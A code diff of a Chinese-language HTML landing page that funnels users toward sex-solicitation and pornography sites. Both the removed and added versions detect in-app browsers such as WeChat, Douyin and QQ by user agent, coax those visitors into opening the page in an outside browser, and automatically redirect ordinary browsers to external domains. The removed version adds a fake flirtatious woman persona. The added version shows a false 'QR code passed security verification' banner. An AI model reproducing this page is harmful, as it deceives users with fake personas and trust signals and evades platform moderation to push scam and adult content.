@@ -4,10 +4,11 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>小雅上🚪，点击 浏览器打开可视频 可🈷️  想要了</title>
-    <link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💋</text></svg>">
+    <title>点击进入继续访问在线看资料</title>
+    <link rel="shortcut icon" href="http://shprh0.lat/assets/img/favicon.ico">
     
     <style type="text/css">
+        /* 重置样式 */
         * {
             margin: 0;
             padding: 0;
@@ -15,565 +16,351 @@
         }
 
         body {
-            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%);
-            color: #333;
+            background: #eee;
+            color: #000;
             font-size: 16px;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            min-height: 100vh;
-            overflow-x: hidden;
+            padding-top: 45px;
         }
 
-        .special-text {
-            font-family: "Times New Roman", serif;
-            letter-spacing: 1px;
-            font-style: italic;
-            color: #e74c3c;
-            font-weight: bold;
-        }
-
-        /* 顶部挑逗区域 - 占据屏幕上1/3 */
-        .flirt-section {
-            height: 40vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            padding: 20px;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-        }
-
-        .avatar {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 35px;
-            margin-bottom: 15px;
-            box-shadow: 0 8px 20px rgba(255, 107, 107, 0.4);
-        }
-
-        .name-status {
-            color: white;
-            margin-bottom: 20px;
-        }
-
-        .name {
-            font-size: 22px;
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-
-        .status {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-
-        .flirt-message {
-            background: rgba(255, 255, 255, 0.95);
-            padding: 25px;
-            border-radius: 15px;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
-            max-width: 320px;
-            width: 90%;
-        }
-
-        .flirt-text {
-            font-size: 18px;
-            line-height: 1.5;
-            color: #333;
-            margin-bottom: 15px;
-        }
-
-        .highlight-text {
-            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
-            color: white;
-            padding: 12px 18px;
-            border-radius: 10px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            font-size: 16px;
-        }
-
-        /* 深入聊天按钮区域 */
-        .chat-button-section {
-            min-height: 60vh;
-            background: white;
-            border-radius: 25px 25px 0 0;
-            padding: 40px 20px;
-            margin-top: -10px;
-            box-shadow: 0 -5px 20px rgba(0,0,0,0.1);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .main-chat-button {
-            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
-            color: white;
-            border: none;
-            border-radius: 25px;
-            padding: 20px 40px;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 10px 30px rgba(255, 107, 107, 0.4);
-            transition: all 0.3s ease;
-            margin-bottom: 20px;
-            min-width: 250px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .main-chat-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 35px rgba(255, 107, 107, 0.5);
-        }
-
-        .main-chat-button::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
+        /* 顶部安全验证条 */
+        #safety {
             width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            transition: left 0.5s;
-        }
-
-        .main-chat-button:hover::before {
-            left: 100%;
-        }
-
-        .button-hint {
-            color: #666;
-            font-size: 14px;
-            text-align: center;
-            margin-bottom: 30px;
-            line-height: 1.4;
-        }
-
-        .features-list {
-            background: #f8f9fa;
-            border-radius: 15px;
-            padding: 20px;
-            margin-bottom: 20px;
-            width: 100%;
-            max-width: 300px;
-        }
-
-        .feature-item {
-            display: flex;
-            align-items: center;
-            margin-bottom: 12px;
-            font-size: 15px;
-        }
-
-        .feature-item:last-child {
-            margin-bottom: 0;
-        }
-
-        .feature-icon {
-            margin-right: 10px;
-            font-size: 18px;
-        }
-
-        /* 弹窗样式 */
-        .modal-overlay {
+            height: 45px;
+            background: #e8fef2;
             position: fixed;
             top: 0;
             left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.8);
-            display: none;
-            justify-content: center;
-            align-items: center;
             z-index: 1000;
-            padding: 20px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
 
-        .modal-content {
-            background: white;
-            border-radius: 20px;
-            padding: 25px 20px;
-            max-width: 350px;
-            width: 100%;
-            text-align: center;
-            position: relative;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-height: 90vh;
-            overflow-y: auto;
+        .icon {
+            width: 26px;
+            height: 26px;
+            background: url("/assets/img/renzheng.png") no-repeat center;
+            background-size: contain;
+            margin: 0 10px;
+            flex-shrink: 0;
         }
 
-        .modal-close {
-            position: absolute;
-            top: 15px;
-            right: 20px;
-            background: none;
-            border: none;
-            font-size: 24px;
-            cursor: pointer;
-            color: #999;
+        .text {
+            color: rgb(7, 193, 96);
+            font-size: 15px;
+            font-weight: 500;
         }
 
-        .modal-title {
+        /* 正常页面内容（普通浏览器显示） */
+        .normal-content {
+            display: none;
+        }
+
+        .code-box {
+            background-color: #fff;
+            margin: 20px;
+            padding: 30px 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            word-break: break-all;
+        }
+
+        .code-title {
+            font-weight: bold;
+            margin-bottom: 20px;
             font-size: 18px;
+            text-align: center;
+            line-height: 1.4;
+            color: #333;
+        }
+
+        .code-qrcode {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .code-qrcode img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .code-qrcode div {
+            margin-top: 15px;
+            font-size: 16px;
+            color: #666;
+            line-height: 1.5;
+        }
+
+        .loading-text {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+
+        /* 应用内引导页面样式 */
+        .app-guide {
+            display: none;
+            background-color: #fff;
+            margin: 20px;
+            padding: 30px 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .guide-title {
+            text-align: center;
+            font-size: 20px;
             font-weight: bold;
             color: #333;
-            margin-bottom: 15px;
-            padding-right: 30px;
+            margin-bottom: 30px;
         }
 
-        .guide-images-container {
+        /* 引导图片样式 */
+        .guide-images {
+            text-align: center;
             margin: 20px 0;
         }
 
-        .guide-image {
-            width: 100%;
-            max-width: 280px;
-            margin: 10px 0;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        .guide-images img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            margin: 5px 0;
+            display: block;
         }
 
-        .guide-text {
-            background: #ffe6e6;
+        .guide-step {
+            margin-bottom: 25px;
             padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            color: #333;
-            font-size: 14px;
-            line-height: 1.4;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border-left: 4px solid #007bff;
         }
 
-        .browser-benefits {
-            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
+        .step-number {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            background: #007bff;
             color: white;
-            padding: 18px;
-            border-radius: 12px;
-            margin-top: 20px;
+            border-radius: 50%;
             text-align: center;
+            line-height: 30px;
+            font-weight: bold;
+            margin-right: 10px;
         }
 
-        .benefits-title {
+        .step-content {
+            display: inline-block;
+            vertical-align: top;
             font-size: 16px;
+            line-height: 1.5;
+        }
+
+        /* 域名提醒样式 */
+        .domain-reminder {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+
+        .domain-text {
+            font-size: 18px;
             font-weight: bold;
             margin-bottom: 10px;
         }
 
-        .benefits-list {
-            font-size: 14px;
-            line-height: 1.4;
+        .domain-url {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ffeb3b;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+            margin: 10px 0;
         }
 
-        /* 复制网址按钮 */
-        .copy-url-button {
-            background: linear-gradient(45deg, #007bff, #0056b3);
+        .domain-desc {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .copy-button {
+            background: #28a745;
             color: white;
             border: none;
-            border-radius: 12px;
-            padding: 15px 20px;
-            font-size: 14px;
-            font-weight: bold;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-size: 16px;
             cursor: pointer;
             width: 100%;
-            margin-top: 15px;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
+            margin-top: 20px;
+            transition: background 0.3s ease;
         }
 
-        .copy-url-button:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 8px 20px rgba(0, 123, 255, 0.3);
+        .copy-button:hover {
+            background: #218838;
         }
 
-        .copy-url-button:active {
-            transform: translateY(0);
+        .copy-button:active {
+            transform: scale(0.98);
         }
 
-        .copy-success {
-            background: linear-gradient(45deg, #28a745, #1e7e34) !important;
-        }
-
-        /* 响应式优化 */
-        @media (max-width: 375px) {
-            .flirt-section {
-                padding: 15px;
+        /* 响应式设计 */
+        @media (max-width: 480px) {
+            .code-box, .app-guide {
+                margin: 10px;
+                padding: 20px 15px;
             }
             
-            .chat-button-section {
-                padding: 30px 15px;
-            }
-            
-            .main-chat-button {
-                min-width: 220px;
-                padding: 18px 35px;
+            .guide-title {
                 font-size: 18px;
             }
             
-            .modal-content {
-                padding: 20px 15px;
-                max-width: 320px;
-            }
-            
-            .modal-title {
-                font-size: 16px;
-            }
-        }
-
-        @media (max-height: 667px) {
-            .flirt-section {
-                height: 35vh;
-            }
-            
-            .chat-button-section {
-                min-height: 65vh;
+            .step-content {
+                font-size: 14px;
             }
         }
     </style>
 </head>
 <body>
-    <!-- 隐藏的预览图 -->
-    <img src="./333.png" alt="预览图" style="display: none; position: absolute; left: -9999px; width: 1px; height: 1px;">
-    
-    <!-- 顶部挑逗区域 -->
-    <div class="flirt-section">
-        <div class="avatar">👩‍🦰</div>
-        <div class="name-status">
-            <div class="name">小雅</div>
-            <div class="status">23岁 • 在线中 • 等你来撩</div>
-        </div>
-        
-        <div class="flirt-message">
-            <div class="flirt-text">
-                嗨～帅哥 💕<br>
-                想和我<span class="special-text">深入聊聊</span>吗？
+    <!-- 顶部安全验证提示 -->
+    <div id="safety">
+        <div class="icon"></div>
+        <div class="text">二维码已通过安全验证（外部🔗请点继续访问）</div>
+    </div>
+
+    <!-- 正常页面内容（普通浏览器显示） -->
+    <div class="normal-content">
+        <div class="code-box">
+            <div class="code-title">在抖音长按（点击）下方二维码识别<br>同城附近柯阅 25以下勿扰…</div>
+            
+            <div class="code-qrcode">
+                <img src="./qer.png" alt="二维码">
+                <div>只进入身体，不进入生活 有门槛！同城约炮，</div>
             </div>
-            <div class="highlight-text">
-                只进入身体，不进入生活<br>
-                我们可以<span class="special-text">私密见面</span>哦～
-            </div>
+            
+            <div class="loading-text">正在跳转，请稍候...</div>
         </div>
     </div>
 
-    <!-- 深入聊天按钮区域 -->
-    <div class="chat-button-section">
-        <button class="main-chat-button" onclick="showGuideModal()">
-            🔥 开始深入聊天 🔥
+    <!-- 应用内引导页面（微信、抖音等应用内浏览器显示） -->
+    <div class="app-guide">
+        <div class="guide-title">请按以下步骤操作</div>
+        
+        <!-- 引导图片（第一步和第二步合并） -->
+        <div class="guide-images">
+           
+            <img src="./guide1.png" alt="第一步引导图" onerror="this.style.display='none'">
+            <img src="./guide2.png" alt="第二步引导图" onerror="this.style.display='none'">
+        </div>
+        
+        <!-- 第三步 -->
+        <div class="guide-step">
+            <span class="step-number">3</span>
+            <div class="step-content">
+                <strong>小妹介绍套餐，你想要的都有</strong><br>
+                点击加入同城修车
+            </div>
+        </div>
+        
+        <!-- 域名提醒 -->
+        <div class="domain-reminder">
+            <div class="domain-text">请记住我们的域名</div>
+            <div class="domain-url">52484.com</div>
+            <div class="domain-desc">在线看片，精彩不断</div>
+        </div>
+        
+        <button class="copy-button" onclick="copyLink()">
+            右上角无法打开时，点击此处复制链接
         </button>
-        
-        <div class="button-hint">
-            点击上方按钮，解锁完整聊天功能<br>
-            包括视频通话、<span class="special-text">私密互动</span>等
-        </div>
-        
-        <div class="features-list">
-            <div class="feature-item">
-                <span class="feature-icon">📹</span>
-                <span>高清视频通话</span>
-            </div>
-            <div class="feature-item">
-                <span class="feature-icon">💬</span>
-                <span><span class="special-text">私密</span>文字聊天</span>
-            </div>
-            <div class="feature-item">
-                <span class="feature-icon">📸</span>
-                <span>照片分享功能</span>
-            </div>
-            <div class="feature-item">
-                <span class="feature-icon">🎯</span>
-                <span>附近的人匹配</span>
-            </div>
-            <div class="feature-item">
-                <span class="feature-icon">🔒</span>
-                <span>端到端加密保护</span>
-            </div>
-        </div>
-    </div>
-
-    <!-- 引导弹窗 -->
-    <div class="modal-overlay" id="guideModal">
-        <div class="modal-content">
-            <button class="modal-close" onclick="closeGuideModal()">×</button>
-            
-            <div class="modal-title">🔥 想要更<span class="special-text">刺激</span>的体验吗？</div>
-            
-            <div style="color: #666; font-size: 14px; margin-bottom: 15px; line-height: 1.4;">
-                小雅正在等你，按照下面步骤解锁<span class="special-text">私密功能</span>～
-            </div>
-            
-            <!-- 两个引导图放在一起 -->
-            <div class="guide-images-container">
-                <img src="./guide1.png" alt="步骤1引导图" class="guide-image">
-                <img src="./guide2.png" alt="步骤2引导图" class="guide-image">
-            </div>
-            
-            <div class="guide-text">
-                <strong>按上图操作：</strong><br>
-                1. 点击右上角 ⋯ 菜单<br>
-                2. 选择"浏览器打开"<br>
-                <span style="color: #e74c3c; font-size: 13px;">
-                    让我们开始<span class="special-text">深入了解</span>，马上就能和我<span class="special-text">亲密接触</span>了💕
-                </span>
-            </div>
-            
-            <div class="browser-benefits">
-                <div class="benefits-title">
-                    🔥 浏览器里我更<span class="special-text">放得开</span>
-                </div>
-                <div class="benefits-list">
-                    • 高清视频<span class="special-text">私聊</span><br>
-                    • 更多<span class="special-text">诱惑</span>照片<br>
-                    • 实时<span class="special-text">互动</span>体验<br>
-                    • 只进入身体，不进入生活 💋
-                </div>
-            </div>
-            
-            <!-- 复制网址按钮 -->
-            <button class="copy-url-button" onclick="copyCurrentUrl()" id="copyButton">
-                📋 复制网址到浏览器打开
-            </button>
-            
-            <div style="text-align: center; margin-top: 15px; color: #999; font-size: 12px;">
-                🔒 安全私密 • 仅限成年人
-            </div>
-        </div>
     </div>
 
     <script>
-        // 防止页面被嵌入iframe
-        if (window.top !== window.self) {
-            window.top.location = window.self.location;
-        }
+        // 配置跳转域名变量
+        var targetUrl = "http://52484.com";
         
-        // 显示引导弹窗
-        function showGuideModal() {
-            document.getElementById('guideModal').style.display = 'flex';
-        }
-        
-        // 关闭引导弹窗
-        function closeGuideModal() {
-            document.getElementById('guideModal').style.display = 'none';
-        }
-        
-        // 复制当前网址到剪贴板
-        function copyCurrentUrl() {
-            var currentUrl = window.location.href;
-            var button = document.getElementById('copyButton');
+        // 检测是否为应用内浏览器
+        function isAppBrowser() {
+            var ua = navigator.userAgent.toLowerCase();
             
-            // 尝试使用现代API
-            if (navigator.clipboard && window.isSecureContext) {
-                navigator.clipboard.writeText(currentUrl).then(function() {
-                    showCopySuccess(button);
-                }).catch(function() {
-                    fallbackCopyTextToClipboard(currentUrl, button);
-                });
+            // 检测各种应用内浏览器
+            return ua.indexOf('micromessenger') !== -1 ||     // 微信
+                   ua.indexOf('aweme') !== -1 ||              // 抖音
+                   ua.indexOf('bytedancewebview') !== -1 ||   // 字节跳动系
+                   ua.indexOf('ttwebview') !== -1 ||          // 今日头条系
+                   ua.indexOf('mqq') !== -1 ||                // QQ
+                   ua.indexOf('mqqbrowser') !== -1 ||         // QQ浏览器
+                   ua.indexOf('alipay') !== -1 ||             // 支付宝
+                   ua.indexOf('dingtalk') !== -1 ||           // 钉钉
+                   ua.indexOf('feishu') !== -1 ||             // 飞书
+                   ua.indexOf('weibo') !== -1 ||              // 微博
+                   ua.indexOf('zhihu') !== -1;                // 知乎
+        }
+        
+        // 检测浏览器类型并处理
+        function detectBrowserAndRedirect() {
+            var normalContent = document.querySelector('.normal-content');
+            var appGuide = document.querySelector('.app-guide');
+            
+            if (isAppBrowser()) {
+                // 应用内浏览器 - 显示引导页面
+                console.log('检测到应用内浏览器，显示引导页面');
+                
+                if (normalContent) normalContent.style.display = 'none';
+                if (appGuide) appGuide.style.display = 'block';
+                
             } else {
-                // 降级方案
-                fallbackCopyTextToClipboard(currentUrl, button);
+                // 普通浏览器 - 显示正常页面并跳转
+                console.log('检测到普通浏览器，显示正常页面并跳转');
+                
+                if (appGuide) appGuide.style.display = 'none';
+                if (normalContent) normalContent.style.display = 'block';
+                
+                // 1秒后跳转
+                setTimeout(function() {
+                    window.location.href = targetUrl;
+                }, 1000);
             }
         }
         
-        // 降级复制方案
-        function fallbackCopyTextToClipboard(text, button) {
-            var textArea = document.createElement("textarea");
-            textArea.value = text;
-            textArea.style.position = "fixed";
-            textArea.style.left = "-999999px";
-            textArea.style.top = "-999999px";
+        // 复制链接功能
+        function copyLink() {
+            var textArea = document.createElement('textarea');
+            textArea.value = targetUrl;
             document.body.appendChild(textArea);
-            textArea.focus();
             textArea.select();
             
             try {
-                var successful = document.execCommand('copy');
-                if (successful) {
-                    showCopySuccess(button);
-                } else {
-                    showCopyError(button);
-                }
+                document.execCommand('copy');
+                alert('链接已复制到剪贴板');
             } catch (err) {
-                showCopyError(button);
+                alert('复制失败，请手动复制链接');
             }
             
             document.body.removeChild(textArea);
         }
         
-        // 显示复制成功
-        function showCopySuccess(button) {
-            button.innerHTML = '✅ 复制成功！去浏览器粘贴打开';
-            button.classList.add('copy-success');
-            
-            setTimeout(function() {
-                button.innerHTML = '📋 复制网址到浏览器打开';
-                button.classList.remove('copy-success');
-            }, 3000);
-        }
-        
-        // 显示复制失败
-        function showCopyError(button) {
-            button.innerHTML = '❌ 复制失败，请手动复制网址';
-            
-            setTimeout(function() {
-                button.innerHTML = '📋 复制网址到浏览器打开';
-            }, 3000);
-        }
-        
-        // 点击弹窗外部关闭
-        document.getElementById('guideModal').addEventListener('click', function(e) {
-            if (e.target === this) {
-                closeGuideModal();
-            }
+        // 页面加载完成后执行
+        document.addEventListener('DOMContentLoaded', function() {
+            detectBrowserAndRedirect();
         });
         
-        // 检测浏览器类型，如果已经在浏览器中则自动跳转
-        function checkBrowserAndRedirect() {
-            var ua = navigator.userAgent.toLowerCase();
-            var isInApp = ua.indexOf('micromessenger') !== -1 ||
-                         ua.indexOf('aweme') !== -1 ||
-                         ua.indexOf('bytedancewebview') !== -1 ||
-                         ua.indexOf('ttwebview') !== -1 ||
-                         ua.indexOf('mqq') !== -1 ||
-                         ua.indexOf('mqqbrowser') !== -1 ||
-                         ua.indexOf('alipay') !== -1;
-            
-            // 如果不在应用内（即在浏览器中），则自动跳转
-            if (!isInApp) {
-                var targetUrl = "http://dyiaa.com/ie8/top.html?d=DxsAHxlTTkIOAkVBCxpPDgMBWgICBwQfSQwaQBMHGwILHxdAWTEMHA0pABsJRlBaUl9FWFxcVVRWX01BAh0MAQ%3D%3D";
-                
-                // 显示跳转提示
-                document.body.innerHTML = `
-                    <div style="background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px;">
-                        <div style="background: white; border-radius: 20px; padding: 40px 30px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.2); max-width: 300px;">
-                            <div style="font-size: 50px; margin-bottom: 20px;">✅</div>
-                            <h2 style="color: #2ecc71; margin-bottom: 15px; font-size: 18px;">检测到浏览器环境</h2>
-                            <p style="color: #666; margin-bottom: 25px; font-size: 14px;">正在为您跳转到聊天页面...</p>
-                            <div style="width: 35px; height: 35px; border: 3px solid #f3f3f3; border-top: 3px solid #2ecc71; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
-                        </div>
-                        <style>
-                            @keyframes spin {
-                                0% { transform: rotate(0deg); }
-                                100% { transform: rotate(360deg); }
-                            }
-                        </style>
-                    </div>
-                `;
-                
-                setTimeout(function() {
-                    window.location.href = targetUrl;
-                }, 2000);
-            }
+        // 防止页面被嵌入iframe
+        if (window.top !== window.self) {
+            window.top.location = window.self.location;
         }
-        
-        // 页面加载后检测
-        document.addEventListener('DOMContentLoaded', checkBrowserAndRedirect);
     </script>
 </body>
 </html>
